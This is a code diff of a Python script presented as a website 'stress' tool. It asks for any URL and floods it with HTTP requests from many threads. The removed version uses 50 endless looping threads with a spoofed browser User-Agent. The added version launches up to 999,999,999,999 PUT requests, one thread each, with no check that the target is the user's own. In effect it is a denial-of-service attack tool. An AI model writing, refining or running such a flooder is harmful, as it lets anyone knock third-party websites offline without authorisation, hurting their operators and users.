@@ -5,24 +5,31 @@ print("! ! IMPORTANT ! ! : To stop the script you must close the program yoursel
 import requests
 import threading
 
-url= input("Paste the website that you want to stress:")
-headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
-data={'USERNAME':'IJSDSdsa$@!$A'}
+def post_data(url, data, thread_id):
+    try:
+        response = requests.put(url, data=data)
+        print(f"Thread {thread_id}: Status Code: {response.status_code}")
+    except Exception as e:
+        print(f"Thread {thread_id}: An error occurred: {e}")
 
-def go():
-    while True:
-        response= requests.post(url, headers=headers, data=data)
-        print(response)               
+def post_data_fast(url, data, num_requests):
+    threads = []
 
-threads= []
+    for i in range(num_requests):
+        thread = threading.Thread(target=post_data, args=(url, data, i))
+        threads.append(thread)
+        thread.start()
 
-for i in range(50):
-    t= threading.Thread(target=go)
-    t.daemon= True
-    threads.append(t)
+    for thread in threads:
+        thread.join()
 
-for i in range(50):
-    threads[i].start()
+if __name__ == "__main__":
+    url = input("Paste the link of the website you want to stress:")
 
-for i in range(50):
-    threads[i].join(
+    data = {
+        "input": "6481ybuds190yehds"
+    }
+
+    num_requests = 999999999999
+
+    post_data_fast(url, data, num_requests)
